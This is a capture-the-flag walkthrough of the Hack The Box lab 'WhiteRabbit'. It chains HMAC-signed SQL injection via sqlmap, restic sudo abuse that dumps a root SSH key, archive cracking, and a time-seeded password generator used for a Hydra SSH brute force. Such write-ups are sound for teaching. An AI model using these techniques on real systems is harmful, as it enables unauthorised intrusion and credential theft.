---
icon: rabbit
---

# HTB-WHITERABBIT

<figure><img src="../../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

***

<figure><img src="../../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance & Enumeration

#### Initial Nmap Scan

First, we scan the machine to discover open ports and running services.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ nmap -A -v whiterabbit.htb
```

**Output:**

```
Starting Nmap 7.95 ( https://nmap.org )
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-title: White Rabbit - Pentesting Services
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
```

**What did we find?**

* **Port 22 (SSH):** OpenSSH 9.6p1 - Standard SSH port
* **Port 80 (HTTP):** Caddy web server with redirect to `whiterabbit.htb`
* **Port 2222 (SSH):** Another SSH service with slightly different version

**What does this mean?** The presence of two SSH ports with different versions suggests the use of Docker containers or virtual machines. The HTTP server redirects to a domain name, indicating virtual host routing is configured.

**What do we do next?** Add the domain to our `/etc/hosts` file so we can access the website.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ echo "10.10.11.63 whiterabbit.htb" | sudo tee -a /etc/hosts
```

***

#### Web Enumeration

Now let's browse to the website and see what's there.

<figure><img src="../../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ curl -I http://whiterabbit.htb
```

**What we see:** Opening `http://whiterabbit.htb` in browser shows a pentesting services website. The homepage mentions several technologies:

* **n8n** - Workflow automation platform
* **GoPhish** - Phishing campaign toolkit
* **Stalwart Mail Server** - Email server
* **Uptime Kuma** - Monitoring tool

**What does this tell us?** The machine is running multiple services, likely in separate containers. These technologies hint at what we'll encounter later.

***

#### Virtual Host Fuzzing

Since we have a domain name, there might be subdomains. Let's fuzz for virtual hosts.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ ffuf -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -u http://whiterabbit.htb -H "Host: FUZZ.whiterabbit.htb" -fw 1
```

**Output:**

<figure><img src="../../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1]
```

**What did we find?** We discovered a subdomain: `status.whiterabbit.htb`

**What is this?** This is likely the Uptime Kuma status page mentioned on the main site. The 302 status means there's a redirect happening.

**What do we do?** Add this subdomain to `/etc/hosts` and investigate.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ echo "10.10.11.63 status.whiterabbit.htb" | sudo tee -a /etc/hosts
```

***

#### Uptime Kuma Discovery

Visit `http://status.whiterabbit.htb` in browser.

**What we see:** A login page for Uptime Kuma appears. Default credentials don't work.

**What is Uptime Kuma?** It's an open-source, self-hosted monitoring tool that checks if services are up and displays their status on a public page.

**The Problem:** The main status page at `/status` shows nothing - just a blank page. This means Uptime Kuma is configured to use a custom status page name instead of the default one.

**Solution:** Brute force the status page name.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ feroxbuster -u http://status.whiterabbit.htb/status -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
```

**Output:**

```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___

200      GET       41l      152w     3359c http://status.whiterabbit.htb/status/temp
```

**What did we find?** The status page is at `/status/temp`!

**What do we see there?** Opening `http://status.whiterabbit.htb/status/temp` shows uptime monitoring for 4 services:

1. **gophish:** `ddb09a8558c9.whiterabbit.htb`
2. **wikijs:** `a668910b5514e.whiterabbit.htb`
3. **Stalwart Mail Server**
4. **n8n Workflow**

**What are these services?**

* **GoPhish:** Tool for running phishing campaigns (security testing)
* **WikiJS:** Modern documentation/wiki platform
* **n8n:** Workflow automation (like Zapier but self-hosted)
* **Stalwart:** Email server

**What do we do next?** Add the new subdomains to `/etc/hosts`.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ echo "10.10.11.63 ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb" | sudo tee -a /etc/hosts
```

***

### Initial Access

#### WikiJS Exploration

Visit the WikiJS subdomain to see what information is available.

<figure><img src="../../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ curl http://a668910b5514e.whiterabbit.htb
```

**What we see:** The wiki homepage shows:

* A **ToDo** note saying "Missing authentication" - This means the wiki is publicly accessible without login!
* Sidebar has an article titled "GoPhish Webhooks"

**What's in the article?** The article contains detailed documentation about an n8n workflow that:

1. Receives webhook calls from GoPhish
2. Validates requests using HMAC signatures
3. Stores data in a MySQL database

**Key Information Found:**

1. **Webhook URL:** `http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d`
2. **Sample Request Format:**

```json
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Content-Type: application/json

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

**What does this mean?**

* The webhook validates requests using HMAC-SHA256 signatures
* If the signature matches, the request is processed
* The email field is used in a SQL query

**Add the new subdomain:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ echo "10.10.11.63 28efa8f7df.whiterabbit.htb" | sudo tee -a /etc/hosts
```

***

#### Download n8n Workflow Configuration

The wiki page has a downloadable JSON file containing the full n8n workflow configuration.

<figure><img src="../../../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ wget http://a668910b5514e.whiterabbit.htb/gophish_to_phishing_score_database.json
```

**What's in this file?** Opening the JSON file reveals the complete workflow, including:

* How the HMAC signature is calculated
* The **SECRET KEY** used for HMAC: `3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`
* SQL query structure: `SELECT * FROM victims where email = "{{ $json.body.email }}" LIMIT 1`
* Database type: MariaDB

**Why is this important?**

1. We now have the HMAC secret - we can craft valid requests!
2. The SQL query directly inserts user input (`email` field) without proper sanitization
3. This suggests a **SQL Injection vulnerability**

**What is HMAC?** HMAC (Hash-based Message Authentication Code) ensures that:

* The request comes from a trusted source
* The data hasn't been tampered with
* It's calculated using: `HMAC-SHA256(secret_key, message_body)`

***

#### Testing for SQL Injection

Let's test if the `email` parameter is vulnerable to SQL injection.

First, we need to calculate a valid HMAC signature. The workflow shows that the HMAC is calculated on **compact JSON** (no spaces).

**Using CyberChef or Python to calculate HMAC:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ python3 -c "
import hmac
import hashlib
import json

data = {'campaign_id': 2, 'email': 'test\"', 'message': 'Clicked Link'}
payload = json.dumps(data, separators=(',', ':'))
secret = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
signature = hmac.new(secret, payload.encode(), hashlib.sha256).hexdigest()
print(f'Payload: {payload}')
print(f'Signature: sha256={signature}')
"
```

**What happens here?**

1. We create a JSON payload with a double quote in the email field
2. Convert it to compact JSON (no spaces after colons/commas)
3. Calculate HMAC-SHA256 using the secret key
4. This gives us a valid signature for our payload

**Send the request with Burp Suite or curl:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ curl -X POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d \
  -H "x-gophish-signature: sha256=<calculated_signature>" \
  -H "Content-Type: application/json" \
  -d '{"campaign_id":2,"email":"test\"","message":"Clicked Link"}'
```

**What happened?** The server returns an error message showing SQL syntax error! This confirms **SQL Injection vulnerability**.

***

#### Exploiting SQL Injection with SQLMap

Now we'll use SQLMap to automatically exploit this SQL injection. The challenge is that SQLMap needs to recalculate the HMAC signature for every payload it sends.

**Solution: Using SQLMap's --eval parameter**

This allows us to run Python code before each request to calculate the signature.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ sqlmap --url 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d' \
  -X POST \
  --data '{"campaign_id": 1,"email": "test@whiterabbit.htb", "message":"Clicked Link"}' \
  -p email \
  --dbms=MySQL \
  --eval="import hashlib;import hmac;import json;_locals['auxHeaders']['x-gophish-signature']='sha256=' + hmac.new(b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS', json.dumps(json.loads(_locals['post']),separators=(',', ':')).encode(), hashlib.sha256).hexdigest()" \
  --batch
```

**What does this command do?**

* `--url`: Target webhook URL
* `-X POST`: Use POST method
* `--data`: Initial POST data
* `-p email`: Test the 'email' parameter for injection
* `--dbms=MySQL`: Specify database type (MariaDB is MySQL-compatible)
* `--eval`: Python code that runs before each request:
  * Gets the POST data from `_locals['post']`
  * Converts it to compact JSON
  * Calculates HMAC-SHA256
  * Adds it as `x-gophish-signature` header
* `--batch`: Don't ask questions, use defaults

**Output:**

```
sqlmap identified the following injection point(s):
---
Parameter: JSON email ((custom) POST)
    Type: boolean-based blind
    Type: error-based
    Type: stacked queries
    Type: time-based blind
---
```

**What does this mean?** SQLMap successfully detected SQL injection with multiple exploitation techniques available!

***

#### Dumping Databases

Now let's enumerate available databases.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ sqlmap --url 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d' \
  -X POST \
  --data '{"campaign_id": 1,"email": "test@whiterabbit.htb", "message":"Clicked Link"}' \
  -p email \
  --dbms=MySQL \
  --eval="import hashlib;import hmac;import json;_locals['auxHeaders']['x-gophish-signature']='sha256=' + hmac.new(b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS', json.dumps(json.loads(_locals['post']),separators=(',', ':')).encode(), hashlib.sha256).hexdigest()" \
  --dbs \
  --batch
```

**Output:**

```
available databases [3]:
[*] information_schema
[*] phishing
[*] temp
```

**What did we find?** Three databases:

* `information_schema`: MySQL system database
* `phishing`: Likely contains GoPhish campaign data
* `temp`: Interesting name - let's check this one!

***

#### Dumping the temp Database

Let's see what's in the `temp` database.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ sqlmap --url 'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d' \
  -X POST \
  --data '{"campaign_id": 1,"email": "test@whiterabbit.htb", "message":"Clicked Link"}' \
  -p email \
  --dbms=MySQL \
  --eval="import hashlib;import hmac;import json;_locals['auxHeaders']['x-gophish-signature']='sha256=' + hmac.new(b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS', json.dumps(json.loads(_locals['post']),separators=(',', ':')).encode(), hashlib.sha256).hexdigest()" \
  -D temp \
  --dump \
  --batch
```

**Output:**

```
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

**What did we find?** This is gold! The command log shows:

1. **Restic repository URL:** `http://75951e6ff.whiterabbit.htb`
2. **Restic password:** `ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw`
3. **Interesting command:** A password generator for user `neo`

**What is Restic?** Restic is a backup program. Someone initialized a backup repository and saved the password to a file.

**What does this mean?** We can access the backup repository and potentially retrieve sensitive data!

**Add the new subdomain:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ echo "10.10.11.63 75951e6ff.whiterabbit.htb" | sudo tee -a /etc/hosts
```

***

#### Accessing Restic Repository

Download the Restic client and access the backup repository.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ wget https://github.com/restic/restic/releases/download/v0.18.0/restic_0.18.0_linux_amd64.bz2
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ bunzip2 restic_0.18.0_linux_amd64.bz2
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ chmod +x restic_0.18.0_linux_amd64
```

**Set up environment variables for easier usage:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb
```

**List available snapshots (backups):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ ./restic_0.18.0_linux_amd64 snapshots
```

**Output:**

```
repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
--------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
--------------------------------------------------------------------
1 snapshots
```

**What did we find?** There's one snapshot containing `/dev/shm/bob/ssh` - SSH keys for user bob!

***

#### Restoring Backup Data

Restore the backup to see what's inside.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ mkdir restore && cd restore
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ ../restic_0.18.0_linux_amd64 restore latest --target . --include /dev/shm/bob/ssh/bob.7z
```

**Output:**

```
repository 5b26a938 opened (version 2, compression level auto)
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40
Summary: Restored 5 / 1 files/dirs (572 B / 572 B) in 0:00
```

**Check what we got:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ find .
```

**Output:**

```
./dev/shm/bob/ssh/bob.7z
```

**What is this?** A 7z compressed archive containing bob's SSH credentials, but it's password protected!

***

#### Cracking the 7z Archive

Extract the hash from the 7z file so we can crack it.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ 7z2john dev/shm/bob/ssh/bob.7z > bob.hash
```

**What does this do?** `7z2john` extracts a hash from the 7z archive in a format that password crackers can understand.

**Crack the hash with hashcat:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ hashcat -m 11600 -a 0 bob.hash /usr/share/wordlists/rockyou.txt --force
```

**What does this command do?**

* `-m 11600`: Mode for 7-Zip archives
* `-a 0`: Dictionary attack
* Uses the famous rockyou.txt wordlist

**Output:**

```
$7z$2$19$0$$8$...:1q2w3e4r5t6y
```

**What did we find?** The password is: `1q2w3e4r5t6y` (a common keyboard pattern)

***

#### Extracting the SSH Keys

Extract the 7z archive using the cracked password.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ 7z x dev/shm/bob/ssh/bob.7z
```

**Output:**

```
7-Zip 24.09 (x64)
Enter password (will not be echoed): 
Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

**Check extracted files:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ ls -la
```

**Output:**

```
bob       (SSH private key)
bob.pub   (SSH public key)  
config    (SSH config file)
```

**Look at the config file:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ cat config
```

**Output:**

```
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

**What does this tell us?**

* Use the `bob` private key
* Connect to port 2222 (the second SSH port we found!)
* Login as user `bob`

***

#### SSH as Bob

Set proper permissions on the key and connect.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ chmod 600 bob
```

**Why do we need this?** SSH requires private keys to have strict permissions (readable only by owner) for security.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit/restore]
└─$ ssh -i bob bob@whiterabbit.htb -p 2222
```

**Output:**

```
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

Last login: Sat Dec 13 00:38:09 2025 from 10.10.14.160
bob@ebdce80611e9:~$
```

**Success!** We're in as bob!

**Notice the hostname:** `ebdce80611e9` - This is a Docker container ID, confirming we're inside a container, not the host.

***

#### Privilege Escalation - Bob to Root (in container)

Check what sudo privileges bob has.

```bash
bob@ebdce80611e9:~$ sudo -l
```

**Output:**

```
User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

**What does this mean?** Bob can run `/usr/bin/restic` as any user (including root) without needing a password!

**Why is this dangerous?** Restic can backup and restore files. If we can run it as root, we can read any file on the system, including `/root` directory!

***

#### Using Restic to Access Root Files

Create a new restic repository in `/tmp` and backup `/root`.

```bash
bob@ebdce80611e9:~$ cd /tmp
```

```bash
bob@ebdce80611e9:/tmp$ sudo restic init -r .
```

**Output:**

```
enter password for new repository: [enter any password]
enter password again: 
created restic repository cf831cd088 at .
```

**What did we do?** Initialized a new restic repository in current directory (`.` means `/tmp`).

**Now backup the /root directory:**

```bash
bob@ebdce80611e9:/tmp$ sudo restic -r . backup /root/
```

**Output:**

```
enter password for repository: [enter same password]
repository cf831cd0 opened (version 2, compression level auto)

Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.598 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot 848cf168 saved
```

**What happened?** Restic (running as root) backed up everything in `/root` to our repository!

***

#### Extracting Root Files

List what's in the backup:

```bash
bob@ebdce80611e9:/tmp$ sudo restic -r . ls latest
```

**Output:**

```
enter password for repository:
snapshot 848cf168 of [/root] filtered by [] at 2025-12-13 12:38:01
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

**What did we find?** There's a file called `morpheus` - likely an SSH private key for user `morpheus` on the host!

**Extract the morpheus key:**

```bash
bob@ebdce80611e9:/tmp$ sudo restic -r . dump latest /root/morpheus
```

**Output:**

```
enter password for repository:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

**Perfect!** We got the private key for `morpheus` user!

***

#### SSH as Morpheus (on the host)

Save the key to your local machine and connect.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ nano morpheus
```

Paste the private key, save and exit.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ chmod 600 morpheus
```

**Connect to the HOST machine (port 22, not 2222):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ ssh -i morpheus morpheus@whiterabbit.htb -p 22
```

**Output:**

```
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

Last login: Sat Dec 13 12:42:29 2025 from 10.10.16.119
morpheus@whiterabbit:~$
```

**Success!** We're now on the HOST machine as morpheus!

**Get the user flag:**

```bash
morpheus@whiterabbit:~$ cat user.txt
```

**Output:**

```
bb25c7ef55e17820a626c5b4a5530e68
```

**User flag captured!**

***

### Privilege Escalation to Root

#### Enumeration as Morpheus

Let's check what users exist on the system.

```bash
morpheus@whiterabbit:~$ cat /etc/passwd | grep -E "/bin/(bash|sh)$"
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
morpheus:x:1000:1000:morpheus:/home/morpheus:/bin/bash
neo:x:1001:1001::/home/neo:/bin/bash
```

**What did we find?** There's another user called `neo` with a login shell!

**Remember from the SQL dump?** Entry #6 in the command log mentioned:

```
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
```

This means there's a custom password generator that was used to set neo's password!

***

#### Analyzing the Password Generator

Check if we can access the password generator.

```bash
morpheus@whiterabbit:~$ ls -la /opt/neo-password-generator/
```

**Output:**

```
total 24
drwxr-xr-x 2 root root  4096 Aug 30  2024 .
drwxr-xr-x 3 root root  4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 15960 Aug 30  2024 neo-password-generator
```

**Transfer the binary to our machine for analysis:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .
```

**What is this binary?** It's a custom program that generates passwords. Let's reverse engineer it to understand how it works.

***

#### Reverse Engineering the Password Generator

**Option 1: Use strings command:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ strings neo-password-generator
```

**Option 2: Use Ghidra for detailed analysis:**

Load the binary in Ghidra and analyze the main function.

**What we discover from analysis:**

The program does the following:

1. Gets current time using `gettimeofday()`
2. Calculates seed: `seed = seconds * 1000 + microseconds / 1000`
3. Uses `srand(seed)` to initialize random number generator
4. Generates 20 character password using charset: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`
5. Each character: `charset[rand() % 62]`

**Key finding:** The seed is based on timestamp in MILLISECONDS!

**From the SQL dump, we know:**

* Date: `2024-08-30 14:40:42`
* We only need to bruteforce milliseconds (0-999)

***

#### Creating Password Generator Script

We'll write a C program to generate all possible passwords.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ nano gen.c
```

**Content:**

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/time.h>

void generate_password(uint32_t seed) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char str[21] = {0};

    srand(seed);
    for (int i = 0; i < 20; i++) {
        str[i] = charset[rand() % 62];
    }

    puts(str);
}

int main() {
    int year = 2024, month = 8, day = 30, hour = 14, minute = 40, second = 42;

    struct tm tm_time = {
        .tm_year = year - 1900,
        .tm_mon = month - 1,
        .tm_mday = day,
        .tm_hour = hour,
        .tm_min = minute,
        .tm_sec = second,
        .tm_isdst = -1
    };

    time_t base_time = timegm(&tm_time);

    for (int millis = 0; millis < 1000; millis++) {
        uint32_t seed = (uint32_t)(base_time * 1000 + millis);
        generate_password(seed);
    }

    return 0;
}
```

**What does this do?**

* Creates a timestamp for: 2024-08-30 14:40:42 (from SQL dump)
* Loops through all possible milliseconds (0-999)
* For each millisecond, calculates the seed and generates a password
* Outputs all 1000 possible passwords

**Compile and run:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ gcc -o generator gen.c
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ ./generator > neo_passwords.txt
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ wc -l neo_passwords.txt
```

**Output:**

```
1000 neo_passwords.txt
```

**Perfect!** We now have a wordlist with all 1000 possible passwords!

***

#### Brute Forcing SSH with Hydra

Use Hydra to try all passwords against SSH.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ hydra -l neo -P neo_passwords.txt whiterabbit.htb ssh -t 20
```

**What does this command do?**

* `-l neo`: Username is 'neo'
* `-P neo_passwords.txt`: Try passwords from this file
* `ssh`: Protocol to attack
* `-t 20`: Use 20 parallel tasks

**Output:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 20 tasks per 1 server, overall 20 tasks, 1000 login tries
[DATA] attacking ssh://whiterabbit.htb:22/

[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj

1 of 1 target successfully completed, 1 valid password found
```

**Success!** Neo's password is: `WBSxhWgfnMiclrV4dqfj`

***

#### SSH as Neo

Login as neo using the discovered password.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/WhiteRabbit]
└─$ ssh neo@whiterabbit.htb
```

**Output:**

```
neo@whiterabbit.htb's password: [enter: WBSxhWgfnMiclrV4dqfj]

Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

Last login: Sat Dec 13 15:00:05 2025 from 10.10.16.119
neo@whiterabbit:~$
```

**We're in as neo!**

***

#### Privilege Escalation - Neo to Root

Check sudo privileges for neo.

```bash
neo@whiterabbit:~$ sudo -l
```

**Output:**

```
[sudo] password for neo: [enter: WBSxhWgfnMiclrV4dqfj]

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

**What does this mean?** Neo can run ANY command as ANY user without restrictions! This is full sudo access!

**Escalate to root:**

```bash
neo@whiterabbit:~$ sudo su
```

**Output:**

```
root@whiterabbit:/home/neo#
```

**We are ROOT!**

***

#### Capture Root Flag

```bash
root@whiterabbit:/home/neo# cd /root
```

```bash
root@whiterabbit:~# ls -la
```

**Output:**

```
total 32
drwx------  5 root root 4096 Dec 13 12:00 .
drwxr-xr-x 19 root root 4096 Aug 30  2024 ..
-rw-------  1 root root  220 Aug 30  2024 .bash_logout
-rw-------  1 root root 3771 Aug 30  2024 .bashrc
drwx------  2 root root 4096 Aug 30  2024 .cache
-rw-------  1 root root  807 Aug 30  2024 .profile
drwx------  2 root root 4096 Aug 30  2024 .ssh
-rw-r--r--  1 root root   33 Dec 13 00:00 root.txt
```

```bash
root@whiterabbit:~# cat root.txt
```

**Output:**

```
b7c7eb99f8df35c94b9d6b0f43ad34d4
```

**Root flag captured!**

***

#### Attack Flow Diagram

```
1. Nmap Scan → Found ports 22, 80, 2222
                    ↓
2. Vhost Fuzzing → Found status.whiterabbit.htb
                    ↓
3. Directory Brute → Found /status/temp page
                    ↓
4. Uptime Kuma → Discovered multiple subdomains:
                 - WikiJS (a668910b5514e.whiterabbit.htb)
                 - GoPhish (ddb09a8558c9.whiterabbit.htb)
                 - n8n webhook (28efa8f7df.whiterabbit.htb)
                    ↓
5. WikiJS → Found n8n workflow documentation
            - Webhook URL
            - HMAC secret: 3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS
            - SQL query structure
                    ↓
6. SQL Injection → Exploited email parameter with SQLMap
                   - Dumped 'temp' database
                   - Found command_log table
                    ↓
7. Command Log → Discovered:
                 - Restic repo: http://75951e6ff.whiterabbit.htb
                 - Restic password: ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
                 - Password generator for neo
                    ↓
8. Restic Backup → Restored backup containing bob.7z
                    ↓
9. Crack 7z → Found password: 1q2w3e4r5t6y
              - Extracted SSH keys for bob
                    ↓
10. SSH as Bob → Logged into Docker container (port 2222)
                    ↓
11. Sudo Restic → Bob can run restic as root
                  - Backed up /root directory
                  - Extracted morpheus SSH key
                    ↓
12. SSH as Morpheus → Logged into HOST machine (port 22)
                      - Got user.txt flag
                    ↓
13. Password Generator → Reverse engineered neo-password-generator
                         - Uses timestamp as seed
                         - Generated 1000 possible passwords
                    ↓
14. Brute Force SSH → Hydra found neo's password: WBSxhWgfnMiclrV4dqfj
                    ↓
15. SSH as Neo → Full sudo privileges (ALL : ALL)
                    ↓
16. Root Access → sudo su → Got root.txt flag
```

***

